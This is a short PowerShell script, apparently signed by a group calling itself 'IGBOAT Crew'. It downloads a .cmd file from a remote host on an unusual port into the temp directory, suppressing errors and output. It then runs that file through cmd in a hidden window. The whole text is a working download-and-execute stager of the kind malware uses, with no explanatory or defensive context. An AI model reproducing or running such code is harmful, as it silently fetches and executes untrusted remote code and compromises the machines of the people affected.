$a = "http://igboat.com:1169/playit.cmd"
#IGBOAT Crew
$y = "$env:temp\xxxxx.cmd"
IWR -Uri $a -OutFile $y -ErrorAction SilentlyContinue | Out-Null
StarT-ProcesS "cmd" "/c $y" -WindowStyle Hidden